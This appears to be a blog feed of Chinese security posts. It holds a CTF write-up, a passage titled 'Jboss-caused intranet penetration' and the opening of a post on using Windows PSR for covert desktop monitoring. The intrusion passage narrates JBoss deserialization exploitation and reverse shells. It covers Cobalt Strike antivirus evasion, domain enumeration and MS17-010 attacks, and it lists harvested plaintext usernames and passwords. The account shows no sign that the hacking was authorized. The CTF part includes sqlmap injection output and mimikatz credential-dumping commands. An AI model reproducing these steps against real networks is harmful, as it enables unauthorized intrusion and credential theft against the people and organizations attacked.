    <content type="html"><![CDATA[<p>南宁市第二届网络与信息安全技术大赛<br><a id="more"></a></p><h1 id="Basic"><a href="#Basic" class="headerlink" title="Basic"></a>Basic</h1><h2 id="Basic-100-神秘二进制"><a href="#Basic-100-神秘二进制" class="headerlink" title="Basic_100-神秘二进制"></a>Basic_100-神秘二进制</h2><p><img src="/image/南宁市第二届网络与信息安全技术大赛/Basic_100.png" alt="Basic_100"><br>这二进制莫名其妙，因为没人能做出，所以就改题了。<br><img src="/image/南宁市第二届网络与信息安全技术大赛/Basic_100_1.png" alt="Basic_100_1"></p><h2 id="Basic-100-2-Finally-You-get-flag"><a href="#Basic-100-2-Finally-You-get-flag" class="headerlink" title="Basic_100_2-Finally, You get flag!"></a>Basic_100_2-Finally, You get flag!</h2><p><img src="/image/南宁市第二届网络与信息安全技术大赛/Basic_100_2.png" alt="Basic_100_2"><br>附件是一个base64的加密,只要解密就可以看到flag</p><h2 id="Basic-200"><a href="#Basic-200" class="headerlink" title="Basic_200"></a>Basic_200</h2><p><img src="/image/南宁市第二届网络与信息安全技术大赛/Basic_200.png" alt="Basic_200"><br>这道题怎么说呢，看图就知道了。<br><img src="/image/南宁市第二届网络与信息安全技术大赛/Basic_200_1.png" alt="Basic_200_1"></p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Web-100"><a href="#Web-100" class="headerlink" title="Web_100"></a>Web_100</h2><p><img src="/image/南宁市第二届网络与信息安全技术大赛/Web_100.png" alt="Web_100"><br>附件的代码为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">eval(function(p,a,c,k,e,d)&#123;e=function(c)&#123;return(c&lt;a?&quot;&quot;:e(parseInt(c/a)))+((c=c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))&#125;;if(!&apos;&apos;.replace(/^/,String))&#123;while(c--)d[e(c)]=k[c]||e(c);k=[function(e)&#123;return d[e]&#125;];e=function()&#123;return&apos;\\w+&apos;&#125;;c=1;&#125;;while(c--)if(k[c])p=p.replace(new RegExp(&apos;\\b&apos;+e(c)+&apos;\\b&apos;,&apos;g&apos;),k[c]);return p;&#125;(&apos;2 c=E;g m()&#123;2 8=p.q;2 6=l j();f(8.w(&quot;?&quot;)!=-1)&#123;2 h=8.r(1);5=h.9(&quot;&amp;&quot;);d(2 i=0;i&lt;5.o;i++)&#123;6[5[i].9(&quot;=&quot;)[0]]=u(5[i].9(&quot;=&quot;)[1])&#125;&#125;v 6&#125;g n(4,s,e)&#123;7=&quot;&quot;;d(i=0;i&lt;4.o;i++)&#123;k=(s+e)%c;t=e;e=s+e;s=t;7+=4[i]^k&#125;f(7==&quot;x&quot;)b.a(&quot;C\&apos;s z!&quot;);B b.a(&quot;A\&apos;s y!&quot;)&#125;2 3=l j();3=m();b.a(3);n(3[\&apos;4\&apos;],F,D);&apos;,42,42,&apos;||var|Request|key|strs|theRequest|cipher|url|split|log|console|iv|for||if|function|str||Object||new|GetRequest|enc|length|location|search|substr|||unescape|return|indexOf|34558914423312210022264341011282361161032135513678115123012499|Wrong|Right|Something|else|That|21|0xff|13&apos;.split(&apos;|&apos;),0,&#123;&#125;))</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><p>用<a href="http://jsbeautifier.org/进行解密之后为：" target="_blank" rel="noopener">http://jsbeautifier.org/进行解密之后为：</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">var iv = 0xff;</span><br><span class="line">function GetRequest() &#123;</span><br><span class="line">    var url = location.search;</span><br><span class="line">    var theRequest = new Object();</span><br><span class="line">    if (url.indexOf(&quot;?&quot;) != -1) &#123;</span><br><span class="line">        var str = url.substr(1);</span><br><span class="line">        strs = str.split(&quot;&amp;&quot;);</span><br><span class="line">        for (var i = 0; i &lt; strs.length; i++) &#123;</span><br><span class="line">            theRequest[strs[i].split(&quot;=&quot;)[0]] = unescape(strs[i].split(&quot;=&quot;)[1])</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return theRequest</span><br><span class="line">&#125;</span><br><span class="line">function enc(key, s, e) &#123;</span><br><span class="line">    cipher = &quot;&quot;;</span><br><span class="line">    for (i = 0; i &lt; key.length; i++) &#123;</span><br><span class="line">        k = (s + e) % iv;</span><br><span class="line">        t = e;</span><br><span class="line">        e = s + e;</span><br><span class="line">        s = t;</span><br><span class="line">        cipher += key[i] ^ k</span><br><span class="line">    &#125;</span><br><span class="line">    if (cipher == &quot;34558914423312210022264341011282361161032135513678115123012499&quot;) console.log(&quot;That&apos;s Right!&quot;);</span><br><span class="line">    else console.log(&quot;Something&apos;s Wrong!&quot;)</span><br><span class="line">&#125;</span><br><span class="line">var Request = new Object();</span><br><span class="line">Request = GetRequest();</span><br><span class="line">console.log(Request);</span><br><span class="line">enc(Request[&apos;key&apos;], 13, 21);</span><br></pre></td></tr></table></figure></p><p>反推<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function enc(key, s, e) &#123;</span><br><span class="line">    cipher = &quot;&quot;;</span><br><span class="line">    for (i = 0; i &lt; key.length; i++) &#123;</span><br><span class="line">        k = (s + e) % iv;</span><br><span class="line">        t = e;</span><br><span class="line">        e = s + e;</span><br><span class="line">        s = t;</span><br><span class="line">        cipher += key[i] ^ k</span><br><span class="line">    &#125;</span><br><span class="line">    if (cipher == &quot;34558914423312210022264341011282361161032135513678115123012499&quot;) console.log(&quot;That&apos;s Right!&quot;);</span><br></pre></td></tr></table></figure></p><p>得出key为<code>000000003007006000702000</code><br>结合<code>function GetRequest</code>得出<code>payload</code>为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?key=000000003007006000702000</span><br></pre></td></tr></table></figure></p><p>但是提交结果不对。过了大半天，但是一个人都没解出来，官方给出hint<br><img src="/image/南宁市第二届网络与信息安全技术大赛/Web_100_hint.png" alt="Web_100_1"><br>emmmmm，这题就这样吧，看不懂。果然100分。</p><h2 id="Web-200"><a href="#Web-200" class="headerlink" title="Web_200"></a>Web_200</h2><p>转啊转，转啊转，信息收集。<br><img src="/image/南宁市第二届网络与信息安全技术大赛/Web_200_1.png" alt="Web_200_1"></p><p>这个<code>input</code>、这个URL格式，不正是今年<code>NodeJS RCE</code></p><p>参考了这个利用 <a href="https://paper.seebug.org/213/" target="_blank" rel="noopener">Node.js 反序列化漏洞远程执行代码</a><br>但是没成功，弹不了shell的，群里说，直接读直接读。但是我没能直接读出来，得把结果扔到vps上。<br><img src="/image/南宁市第二届网络与信息安全技术大赛/Web_200_2.png" alt="Web_200_2"><br>payload出自于<a href="http://www.jianshu.com/p/16f4a473940a" target="_blank" rel="noopener">如何使用NodeJS写出一枚远程命令执行(RCE）漏洞</a></p><h2 id="Web-300"><a href="#Web-300" class="headerlink" title="Web_300"></a>Web_300</h2><p><img src="/image/南宁市第二届网络与信息安全技术大赛/Web_300.png" alt="Web_300"><br>直接<code>sqlmap</code>就行了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">sqlmap resumed the following injection point(s) from stored session:</span><br><span class="line">---</span><br><span class="line">Parameter: id (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: id=8 AND 4897=4897</span><br><span class="line"></span><br><span class="line">    Type: AND/OR time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind</span><br><span class="line">    Payload: id=8 AND SLEEP(5)</span><br><span class="line">---</span><br><span class="line">[13:39:29] [INFO] the back-end DBMS is MySQL</span><br><span class="line">web application technology: Apache</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.0.12</span><br></pre></td></tr></table></figure></p><p><img src="/image/南宁市第二届网络与信息安全技术大赛/Web_300_sqlmap.png" alt="Web_300_sqlmap"></p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Misc-200-2"><a href="#Misc-200-2" class="headerlink" title="Misc_200_2"></a>Misc_200_2</h2><p><img src="/image/南宁市第二届网络与信息安全技术大赛/Misc_200_2.png" alt="Misc_200_2"><br>这题一直在踩内部doc的坑。<br><img src="/image/南宁市第二届网络与信息安全技术大赛/Misc_200_3.png" alt="Misc_200_3"></p><h2 id="Misc-300"><a href="#Misc-300" class="headerlink" title="Misc_300"></a>Misc_300</h2><p><img src="/image/南宁市第二届网络与信息安全技术大赛/Misc_300.png" alt="Misc_300"><br>先用脚本提取Pcapng中的菜刀流量，这题最大的坑就是数据包有点大大大大大大了。<br><img src="/image/南宁市第二届网络与信息安全技术大赛/Misc_300_ProcDump.png" alt="Misc_300_ProcDump"><br>看到了<code>ProcDump</code>很关键，这道题可能就是利用了<code>ProcDump+mimikatz</code>的组合，毕竟毕竟这样免杀。<br>先导出<code>http</code>，找到了关键点（其实dump的结果都不小），辣鸡数据包、辣鸡电脑，卡到生活不能自理。<br>规则为<code>frame.len == 533</code>,追踪流确实看到关键字<br><img src="/image/南宁市第二届网络与信息安全技术大赛/Misc_300_1.png" alt="Misc_300_1"><br>将数据抠出来，使用<code>mimikatz</code>进行恢复，但是恢复过程中还是出现不少问题，抠出来的数据恢复不了，mimikatz没注意是32还是64等等。。。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe</span><br><span class="line">sekurlsa::minidump lsass.dmp</span><br><span class="line">sekurlsa::logonPasswords full</span><br></pre></td></tr></table></figure></p><p><img src="/image/南宁市第二届网络与信息安全技术大赛/Misc_300_mimikatz.png" alt="Misc_300_mimikatz"></p><h1 id="Mobile"><a href="#Mobile" class="headerlink" title="Mobile"></a>Mobile</h1><h2 id="Android-crackme1"><a href="#Android-crackme1" class="headerlink" title="Android_crackme1"></a>Android_crackme1</h2><p>先用<code>jadx</code>反编译<code>apk</code><br><img src="/image/南宁市第二届网络与信息安全技术大赛/Mobile_Android_crackme1.png" alt="Mobile_Android_crackme1"><br>就一个控件。<br>往下看，了解这个程序的主要思想：输入的<code>Password</code>值，经过<code>CryptClass</code>后，得到的加密结果是否匹配<code>cip</code>，正确就输出<code>Bingo</code>。<br>重点查看<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String enc = CryptClass.encrypt_str(passstr, (String) keys.get(passstr.length() % keys.size()));</span><br><span class="line">if (enc.equals(MainActivity.this.cip)) &#123;</span><br><span class="line">    Toast.makeText(MainActivity.this, &quot;Bingo!&quot;, 1).show();</span><br></pre></td></tr></table></figure></p><p>首先还是得去弄明白它们的值是怎么来的。</p><p>看到<code>R.string.key6</code>，然后去找这个<code>key6</code>，但是找到的是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public static final int key6 = 2131165222;</span><br></pre></td></tr></table></figure></p><p>有安卓开发的人都知道，编写java代码中的常量在一般情况下，我们是定义在string.xml这个文件中，这个string.xml的值会被R文件映射。<br><img src="/image/南宁市第二届网络与信息安全技术大赛/Mobile_Android_crackme1_key6.png" alt="Mobile_Android_crackme1_key6"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">this.Password = (EditText) findViewById(R.id.editText5);</span><br><span class="line">this.Cipher = (EditText) findViewById(R.id.editText6);</span><br><span class="line">this.cip = getString(R.string.key6);</span><br></pre></td></tr></table></figure></p><p>Password值是编辑框接受输入的值，为后续的<code>passstr</code><br>Cipher值不知道干啥<br>cip值为<code>05bfed10af08193ff0b218e887c53dfa162f8a6e8b</code><br><code>passstr.length() % keys.size()</code>的理论值为0,1,2,3,4,5，主要看<code>passstr</code>的长度，因为是<code>passstr</code>的长度决定了调用哪一个<code>keys</code><br>验证得出passstr的长度以及keys值<br><img src="/image/南宁市第二届网络与信息安全技术大赛/Mobile_Android_crackme1_ciplist.png" alt="Mobile_Android_crackme1_ciplist"><br>这样我们就可以得出<code>passstr</code>的长度为21，使用的<code>keys</code>为3，也就是<code>NO1bgoMn14J85yrLQHM9KoZJ</code></p><p>接下来，就看看怎么解密了。看了下，我选择了爆破的方式。<br>在验证<code>passstr</code>的长度以及<code>keys</code>值的时候，发现输入的<code>password</code>值个数是21个，加密后个数变为42，也就是说<code>1个字符加密得出2个字符</code>。<br>那我们就将<code>cip</code>拆开进行每位数的验证<br><img src="/image/南宁市第二届网络与信息安全技术大赛/Mobile_Android_crackme1_flagdemo.png" alt="Mobile_Android_crackme1_flagdemo"><br>顺便说一句，上图不应该是解密，应为加密，还有就是<code>Eclipse的调试不够人性化</code>。拆开验证是：<br><img src="/image/南宁市第二届网络与信息安全技术大赛/Mobile_Android_crackme1_flag.png" alt="Mobile_Android_crackme1_flag"></p><p>看了各位大佬的wp，才发现，<code>CryptClass</code>类里面是有解密函数的。<br><img src="/image/南宁市第二届网络与信息安全技术大赛/Mobile_Android_crackme1_flags.png" alt="Mobile_Android_crackme1_flags"></p><h1 id="ReV"><a href="#ReV" class="headerlink" title="ReV"></a>ReV</h1><h2 id="windows-crackme2"><a href="#windows-crackme2" class="headerlink" title="windows_crackme2"></a>windows_crackme2</h2><p>菜鸡总是看哪些题是多人解出来之后就去做哪题。<br><img src="/image/南宁市第二届网络与信息安全技术大赛/windows_crackme2.png" alt="windows_crackme2"><br>扔进<code>ILSpy</code>没看到源码，扔进<code>Reflector</code>拿到源码。<br><code>Form1</code>的内容为机器码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public Form1()</span><br><span class="line">&#123;</span><br><span class="line">    this.InitializeComponent();</span><br><span class="line">    this.textBox1.Text = &quot;SzLPCCA4&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们要找出相应的注册码，先看源码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">private void button1_Click(object sender, EventArgs e)</span><br><span class="line">&#123;</span><br><span class="line">    string text = this.textBox2.Text;  //注册码框</span><br><span class="line">    SHA1 sha = new SHA1CryptoServiceProvider(); //Sha1编码</span><br><span class="line">    byte[] bytes = Encoding.Unicode.GetBytes(this.textBox1.Text);</span><br><span class="line">    string str2 = BitConverter.ToString(sha.ComputeHash(bytes));  //对SzLPCCA4进行Sha1编码</span><br><span class="line">    string str3 = new string(text.ToCharArray().Reverse&lt;char&gt;().ToArray&lt;char&gt;()); </span><br><span class="line">//对输入的注册码进行反转</span><br><span class="line">    string str4 = &quot;&quot;;</span><br><span class="line">    int num = 0;</span><br><span class="line">    for (int i = 0; i &lt; str3.Length; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        if (text[i] != &apos;-&apos;)</span><br><span class="line">        &#123;</span><br><span class="line">            num++;</span><br><span class="line">            str4 = str4 + str3[i].ToString();</span><br><span class="line">            if (num == 2)</span><br><span class="line">            &#123;</span><br><span class="line">                num = 0;</span><br><span class="line">                if (i != (str3.Length - 1))</span><br><span class="line">                &#123;</span><br><span class="line">                    str4 = str4 + &quot;-&quot;;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    string str5 = AESEncrypt(str2, &quot;H8vY7QKY&quot;, &quot;8@Z&gt;FXsv&quot;); //对sha1编码后的SzLPCCA4进行AES加密</span><br><span class="line">    string str6 = AESEncrypt(str4, &quot;H8vY7QKY&quot;, &quot;8@Z&gt;FXsv&quot;); //对反转后的注册码进行AES加密</span><br><span class="line">    if (str5 == str6)</span><br><span class="line">    &#123;</span><br><span class="line">        MessageBox.Show(&quot;再来一瓶!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        MessageBox.Show(&quot;谢谢参与!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>主体的思想为：</p><blockquote><p>机器码：Sha1编码后再进行AES加密的值为str5<br>注册码：反转后再进行AES加密的值为str6<br>如果str5等于str6则返回再来一瓶，flag则为输入的注册码</p></blockquote><p>解题思路：</p><blockquote><p>AES加密的密钥都是一样的，所以加密前是相等的。<br>只要将机器码进行Sha1编码后再反转就是注册码<br>也就是将str2进行输出后反转或者反转后输出</p></blockquote><p>demo为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public static void Main(string() args)</span><br><span class="line">&#123;</span><br><span class="line">   SHA1 sha = new SHA1CryptoServiceProvider();</span><br><span class="line">       byte[] bytes = Encoding.Unicode.GetBytes(&quot;SzLPCCA4&quot;);</span><br><span class="line">       string str2 = BitConverter.ToString(sha.ComputeHash(bytes));</span><br><span class="line">       MessageBox.Show(str2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>得到的结果为<code>0AC8B571539392065B0B160148832CA2DC2710A1</code>,进行反转且八位每段得出flag。<br>1A0172CD-2AC23884-1061B0B5-60293935-175B8CA0</p><p>最后附张图：<br><img src="/image/南宁市第二届网络与信息安全技术大赛/平衡信息杯.png" alt="平衡信息杯"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;南宁市第二届网络与信息安全技术大赛&lt;br&gt;
    
    </summary>
    
      <category term="CTF" scheme="https://rcoil.me/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://rcoil.me/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Jboss引起的内网渗透</title>
    <link href="https://rcoil.me/2017/10/Jboss%E5%BC%95%E8%B5%B7%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    <id>https://rcoil.me/2017/10/Jboss引起的内网渗透/</id>
    <published>2017-10-16T06:38:39.000Z</published>
    <updated>2017-10-20T11:56:54.273Z</updated>
    
    <content type="html"><![CDATA[<p>待人如知己<br><a id="more"></a><br><img src="/image/Jboss引起的内网渗透/Jboss引起的内网渗透.png" alt="Jboss引起的内网渗透"><br>切入点为<code>Jboss反序列化</code>，就不多说了，远程部署war。<br>war中包含了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell、reGeorg、https.exe</span><br></pre></td></tr></table></figure></p><p>使用<code>https.exe</code>反弹一个msf的shell，不多说，上远控巩固权限。</p><p>P·S：图片是后面补上的</p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>查看进程信息是否有杀软<br>看了一轮没有什么主流的杀软<br><img src="/image/Jboss引起的内网渗透/MsMpEng.png" alt="MsMpEng"><br><code>MsMpEng.exe</code>是属于<code>Windows Defender</code> 自动保护服务的核心进程。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br><span class="line">ipconfig /all</span><br><span class="line">net view</span><br><span class="line">ping</span><br><span class="line">net time /domain</span><br></pre></td></tr></table></figure><p><img src="/image/Jboss引起的内网渗透/systeminfo.png" alt="systeminfo"><br><img src="/image/Jboss引起的内网渗透/ipconfig-all.png" alt="ipconfig-all"><br><img src="/image/Jboss引起的内网渗透/net-view.png" alt="net-view"><br><img src="/image/Jboss引起的内网渗透/ping-com.png" alt="ping-com"><br><img src="/image/Jboss引起的内网渗透/net-time.png" alt="net-time"><br>综合以上信息<br><code>ipconfig /all</code>的信息，<code>DNS suffix search list</code>是<code>xxx.com</code>,nds服务器是xx.18,备份nds服务器为xx.19。<br><code>net time /domain</code> 指向的是xx.17的机器，<code>ping xxx.com</code>指向xx.18(第二天<code>ping xxx.com</code>结果为xx.17)，到第三天再看，又发现是xx.18的。<br>得到的结果：</p><blockquote><p>192.168.1.17 为域控<br>192.168.1.18和192.168.1.19为DNS服务器，不确定是否为域控</p></blockquote><p>不确定的话就下一步确认、<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;domain admins&quot; /domain  #查看域管理员</span><br><span class="line">net group &quot;domain controllers&quot; /domain  #查看域控制器</span><br></pre></td></tr></table></figure></p><p>结果为：<br><img src="/image/Jboss引起的内网渗透/domainadmin.png" alt="domainadmin"><br>那就可以明确xx.17，xx.18，xx.19为域控制器</p><h1 id="小小免杀"><a href="#小小免杀" class="headerlink" title="小小免杀"></a>小小免杀</h1><p>因为是存在着<code>MsMpEng.exe</code>，所以如果不做一些免杀的话，是会被杀掉的。<br><img src="/image/Jboss引起的内网渗透/shellter.png" alt="shellter"><br>使用<code>Cobalt Strike</code>生成一个<code>exe</code>和<code>bin</code>文件，将两者进行混淆，最后生成一个新的<code>exe</code></p><h1 id="横向渗透"><a href="#横向渗透" class="headerlink" title="横向渗透"></a>横向渗透</h1><p>由于是<code>Jboss反序列化</code>为入口(正常不存在提权情况)，在控制台处可以看到类似日志的IP记录，发现了内网还有个<code>172.18.19.10</code>的IP，所以判断还有这么一个段的存在。进到机器上面却没有看到有链接   = =</p><h2 id="组策略漏洞（GPP）"><a href="#组策略漏洞（GPP）" class="headerlink" title="组策略漏洞（GPP）"></a>组策略漏洞（GPP）</h2><p><img src="/image/Jboss引起的内网渗透/SYSVOL.png" alt="SYSVOL"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net use e: \\192.168.1.17\\sysvol（三台）</span><br><span class="line">dir /s groups.xml</span><br></pre></td></tr></table></figure></p><p>找不到<code>groups.xml</code>，这条路不通。</p><h2 id="MS17-010"><a href="#MS17-010" class="headerlink" title="MS17-010"></a>MS17-010</h2><p>先着手用MS17-010打一轮，打一轮再说。留着后面没思路的时候抓密码用。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">MS17-010</span><br><span class="line">FCE-3212：192.168.1.92</span><br><span class="line">Windows 7 Professional 7601 SP 1</span><br><span class="line">FCE-3235：192.168.1.126</span><br><span class="line">Windows 7 Professional 7601 SP 1</span><br><span class="line">FCE-PLOT：192.168.1.217</span><br><span class="line">Windows xp  [!] Target could be either SP2 or SP3</span><br><span class="line">***</span><br><span class="line">***</span><br><span class="line">***</span><br></pre></td></tr></table></figure></p><h2 id="MS14-068-KERBEROS漏洞"><a href="#MS14-068-KERBEROS漏洞" class="headerlink" title="MS14-068 KERBEROS漏洞"></a>MS14-068 KERBEROS漏洞</h2><p>之前也没怎么用过这个漏洞。<br>要测试这个漏洞，前提还是要明白kerberos的整个认证协议过程，不然是不会明白原理的，测试过程中出了什么问题也不知道怎么解决。利用这个漏洞，我们需要一个普通域用户的账户名和密码或者是哈希，哈希传递我已经在别的文章中总结了，其实哈希和密码是有相同的效果。以及域名称，该用户的sids。</p><p>而我们在信息收集的时候，已经将靶机上的域用户账号密码抓取,但是我们不知道域控上面是否存在这个漏洞。<br><img src="/image/Jboss引起的内网渗透/kerberos.png" alt="kerberos"><br>经过一轮测试，发现MS14-068失败。</p><h2 id="抓密码"><a href="#抓密码" class="headerlink" title="抓密码"></a>抓密码</h2><p>靶机上抓不到域管，那就去别的机器去抓。<br>先将有MS17-010的抓一轮，幸运的话，就直接可以了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">FCE-3212：192.168.1.92</span><br><span class="line">Windows 7 Professional 7601 SP 1</span><br><span class="line">* Username : jduffy</span><br><span class="line">* Password : papap111</span><br><span class="line">FCE-UTIL：192.168.1.230</span><br><span class="line">Windows 7 Professional 7601 SP 1</span><br><span class="line">* Username : ComputerRoom</span><br><span class="line">* Password : papap</span><br></pre></td></tr></table></figure></p><p>duang的一样，很幸运，在第二台的时候就发现有域管了。附张图<br><img src="/image/Jboss引起的内网渗透/cobaltstrike-login.png" alt="cobaltstrike-login"><br><img src="/image/Jboss引起的内网渗透/cobaltstrike.png" alt="cobaltstrike"></p><p>我在dumn密码的时候发现一个很奇怪的问题，我打的是192.168.1.244，但是返回来的结果是192.168.1.37的结果，所以我去看了<code>ipconfig /all</code><br><img src="/image/Jboss引起的内网渗透/ipconfig-37.png" alt="ipconfig-37"><br>我就懵了，这不知道是啥情况。</p><p>如果MS17-010行不通的话就开始找漏洞配置不当以获取更多主机权限，然后再继续抓密码。这些在之前的文章是总结过的。</p><p>擦干屁股开溜了，至于内网的广度和深度就不做研究了。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;待人如知己&lt;br&gt;
    
    </summary>
    
      <category term="内网渗透" scheme="https://rcoil.me/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="内网渗透" scheme="https://rcoil.me/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>巧妙利用win自带的 PSR 实现监控Windows桌面</title>
    <link href="https://rcoil.me/2017/09/%E5%B7%A7%E5%A6%99%E5%88%A9%E7%94%A8win%E8%87%AA%E5%B8%A6%E7%9A%84-PSR-%E5%AE%9E%E7%8E%B0%E7%9B%91%E6%8E%A7Windows%E6%A1%8C%E9%9D%A2/"/>
    <id>https://rcoil.me/2017/09/巧妙利用win自带的-PSR-实现监控Windows桌面/</id>
    <published>2017-09-08T09:16:33.000Z</published>
    <updated>2018-11-16T02:59:37.088Z</updated>
    
    <content type="html"><![CDATA[<p>PSR 即win自带的”问题步骤记录器”,也就是说它会捕捉活动窗口。这还是在课上无聊翻到的一个东西，用在屏幕截图上也是有很好的效果，因为是Windows系统自带的，所以不用考虑免杀问题。<br><a id="more"></a></p><hr><p>唯一的限制：要求系统是windows 7之后，也就是在做个人机的时候可以使用，不排除个别的情况。之前不知道有命令行的方法，直到看了三好学生的paper（这段时间一直在啃）。</p><h2 id="进阶"><a href="#进阶" class="headerlink" title="进阶"></a>进阶</h2><p>直接查看进阶只用方法。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">psr.exe [/start |/stop][/output &lt;fullfilepath&gt;] [/sc (0|1)] [/maxsc &lt;value&gt;]</span><br><span class="line">[/sketch (0|1)] [/slides (0|1)] [/gui (0|1)]</span><br><span class="line">[/arcetl (0|1)] [/arcxml (0|1)] 